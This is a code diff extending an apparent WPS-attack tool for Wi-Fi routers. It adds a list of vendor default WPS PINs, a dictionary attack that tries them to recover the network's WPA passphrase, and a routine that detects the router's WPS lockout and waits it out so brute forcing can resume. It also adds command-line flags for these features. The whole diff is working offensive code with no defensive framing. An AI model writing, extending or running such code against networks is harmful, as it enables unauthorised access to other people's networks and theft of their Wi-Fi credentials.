@@ -423,6 +423,12 @@ class Companion:
         self.pixie_creds = PixiewpsData()
         self.connection_status = ConnectionStatus()
 
+        # Lockout tracking (for --wait-unlock mode)
+        self.consecutive_nacks = 0
+        self.wait_unlock = False
+        self.lock_wait = 1800
+        self.nack_threshold = 15
+
         user_home = str(pathlib.Path.home())
         self.sessions_dir = f'{user_home}/.OneShot/sessions/'
         self.pixiewps_dir = f'{user_home}/.OneShot/pixiewps/'
@@ -487,13 +493,15 @@ class Companion:
             elif 'Received M' in line:
                 n = int(line.split('Received M')[1])
                 self.connection_status.last_m_message = n
+                self.consecutive_nacks = 0   # AP is responding normally, not locked
                 print('[*] Received WPS Message M{}'.format(n))
                 if n == 5:
                     print('[+] The first half of the PIN is valid')
             elif 'Received WSC_NACK' in line:
                 self.connection_status.status = 'WSC_NACK'
+                self.consecutive_nacks += 1
                 print('[*] Received WSC NACK')
-                print('[-] Error: wrong PIN code')
+                print('[-] Error: wrong PIN code ({} consecutive NACKs)'.format(self.consecutive_nacks))
             elif 'Enrollee Nonce' in line and 'hexdump' in line:
                 self.pixie_creds.e_nonce = get_hex(line)
                 assert(len(self.pixie_creds.e_nonce) == 16*2)
@@ -590,6 +598,101 @@ class Companion:
         print(f"[+] WPS PIN: '{wps_pin}'")
         print(f"[+] WPA PSK: '{wpa_psk}'")
         print(f"[+] AP SSID: '{essid}'")
+
+    # Common factory/default WPS PINs of modern routers.
+    # Many ISP/OEM firmwares (Huawei, ZTE, TP-Link, D-Link, Tenda, Zyxel,
+    # Netgear, BSNL/ACT etc.) keep WPS enabled with a static default PIN.
+    COMMON_PINS = [
+        ('11111111', 'Universal/default'),
+        ('00000000', 'Zero PIN'),
+        ('12345670', '1234567+checksum'),
+        ('87654321', 'Reversed'),
+        ('22222222', 'Huawei HG series'),
+        ('20080411', 'Huawei/DS-LINK 2008 build'),
+        ('15991190', 'Sagemcom Fast 3688/3868'),
+        ('17121979', 'Sagemcom/Fast built 1979'),
+        ('05779586', 'BSNL/ACT BROADBAND'),
+        ('11810133', 'ZTE defaults'),
+        ('34369774', 'ZTE ZXHN'),
+        ('46264845', 'Broadcom default'),
+        ('63523780', 'Netgear (many models)'),
+        ('12345678', 'Plain 12345678'),
+        ('23648107', 'Zyxel default'),
+        ('56780000', 'D-Link default'),
+        ('07952437', 'TP-Link older'),
+        ('68752279', 'D-Link DIR default'),
+        ('27182818', 'TP-Link Archer default'),
+        ('55501239', 'TP-Link'),
+        ('72903786', 'TP-Link'),
+        ('71525739', 'TP-Link'),
+        ('19690716', 'TP-Link Archer'),
+        ('90773345', 'Sagemcom'),
+        ('08365337', 'Sagemcom'),
+        ('41872721', 'ARRIS'),
+    ]
+
+    def dictionary_attack(self, bssid, delay=None):
+        """
+        Try known factory/default WPS PINs first — modern routers with WPS
+        enabled very often still use a static vendor PIN.
+        """
+        print('[*] Running default-PIN dictionary attack ({} pins)…'.format(len(self.COMMON_PINS)))
+        for pin, name in self.COMMON_PINS:
+            print('[*] Trying {} ({})…'.format(pin, name))
+            self.__wps_connection(bssid, pin)
+            if self.connection_status.status == 'GOT_PSK':
+                self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
+                if self.save_result:
+                    self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
+                if self.auto_connect_enabled:
+                    self.auto_connect(bssid=bssid)
+                return True
+            if self.connection_status.status == 'WPS_FAIL':
+                print('[!] WPS transaction failed — aborting dictionary attack')
+                return False
+            if delay:
+                time.sleep(delay)
+        print('[-] No default PIN worked')
+        return False
+
+    def probe_wps_locked(self, bssid):
+        """Check via 'iw scan' if the AP reports WPS setup locked."""
+        cmd = "iw dev {} scan 2>/dev/null | grep -iA30 '^BSS {}(' | grep -i 'AP setup locked'".format(
+            self.interface, bssid)
+        proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
+                              stderr=subprocess.DEVNULL, encoding='utf-8', errors='replace')
+        out = proc.stdout.strip()
+        if not out:
+            return None   # unknown (no WPS IE seen)
+        try:
+            flag = int(out.split('0x')[-1].split()[0], 16)
+            return bool(flag)
+        except (ValueError, IndexError):
+            return None
+
+    def wait_for_unlock(self, bssid):
+        """
+        Modern routers lock WPS after repeated failures.
+        Wait, periodically re-probe, and return True once the lock clears.
+        """
+        print('[!] Target appears rate-limiting/locking — waiting up to {}s for the lock to clear…'.format(self.lock_wait))
+        waited = 0
+        probe_interval = 60
+        while waited < self.lock_wait:
+            time.sleep(probe_interval)
+            waited += probe_interval
+            locked = self.probe_wps_locked(bssid)
+            if locked is False:
+                print('[+] WPS lock cleared after {}s — resuming'.format(waited))
+                self.consecutive_nacks = 0
+                return True
+            if locked is None:
+                print('[?] Cannot read lock state, resuming cautiously')
+                self.consecutive_nacks = 0
+                return True
+            print('[*] Still locked ({}s waited of {})…'.format(waited, self.lock_wait))
+        print('[-] Lock still active after {}s — give up (rebooting the AP also clears WPS lock)'.format(self.lock_wait))
+        return False
 
     def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
         if not os.path.exists(self.reports_dir):
@@ -819,6 +922,9 @@ class Companion:
             elif self.connection_status.status == 'WPS_FAIL':
                 print('[!] WPS transaction failed, re-trying last pin')
                 return self.__first_half_bruteforce(bssid, f_half)
+            if self.wait_unlock and self.consecutive_nacks >= self.nack_threshold:
+                if not self.wait_for_unlock(bssid):
+                    return False
             f_half = str(int(f_half) + 1).zfill(4)
             self.bruteforce.registerAttempt(f_half)
             if delay:
@@ -841,6 +947,9 @@ class Companion:
             elif self.connection_status.status == 'WPS_FAIL':
                 print('[!] WPS transaction failed, re-trying last pin')
                 return self.__second_half_bruteforce(bssid, f_half, s_half)
+            if self.wait_unlock and self.consecutive_nacks >= self.nack_threshold:
+                if not self.wait_for_unlock(bssid):
+                    return False
             s_half = str(int(s_half) + 1).zfill(3)
             self.bruteforce.registerAttempt(f_half + s_half)
             if delay:
@@ -1216,6 +1325,22 @@ if __name__ == '__main__':
         help='Do not automatically connect to the target network after recovering the PSK (auto-connect is enabled by default)'
         )
     parser.add_argument(
+        '-D', '--dict', '--dictionary',
+        action='store_true',
+        help='Try known factory/default WPS PINs first (works on many modern routers with WPS enabled), then fall back to normal mode'
+        )
+    parser.add_argument(
+        '--wait-unlock',
+        action='store_true',
+        help='During bruteforce, detect WPS lockout and wait for it to clear instead of burning PINs against a locked AP'
+        )
+    parser.add_argument(
+        '--lock-wait',
+        type=int,
+        default=1800,
+        help='Seconds to wait for a WPS lockout to clear with --wait-unlock (default: 1800)'
+        )
+    parser.add_argument(
         '--iface-down',
         action='store_true',
         help='Down network interface when the work is finished'
@@ -1267,10 +1392,16 @@ if __name__ == '__main__':
     if not ifaceUp(args.interface):
         die('Unable to up interface "{}"'.format(args.interface))
 
+    def make_companion():
+        comp = Companion(args.interface, args.write, print_debug=args.verbose,
+                         auto_connect=not args.no_auto_connect)
+        comp.wait_unlock = args.wait_unlock
+        comp.lock_wait = args.lock_wait
+        return comp
+
     while True:
         try:
-            companion = Companion(args.interface, args.write, print_debug=args.verbose,
-                                  auto_connect=not args.no_auto_connect)
+            companion = make_companion()
             if args.pbc:
                 companion.single_connection(pbc_mode=True)
             else:
@@ -1286,13 +1417,16 @@ if __name__ == '__main__':
                     args.bssid = scanner.prompt_network()
 
                 if args.bssid:
-                    companion = Companion(args.interface, args.write, print_debug=args.verbose,
-                                          auto_connect=not args.no_auto_connect)
-                    if args.bruteforce:
-                        companion.smart_bruteforce(args.bssid, args.pin, args.delay)
-                    else:
-                        companion.single_connection(args.bssid, args.pin, args.pixie_dust,
-                                                    args.show_pixie_cmd, args.pixie_force)
+                    companion = make_companion()
+                    got_it = False
+                    if args.dict:
+                        got_it = companion.dictionary_attack(args.bssid, delay=args.delay)
+                    if not got_it:
+                        if args.bruteforce:
+                            companion.smart_bruteforce(args.bssid, args.pin, args.delay)
+                        elif args.pixie_dust or args.pin or not args.dict:
+                            companion.single_connection(args.bssid, args.pin, args.pixie_dust,
+                                                        args.show_pixie_cmd, args.pixie_force)
             if not args.loop:
                 break
             else:
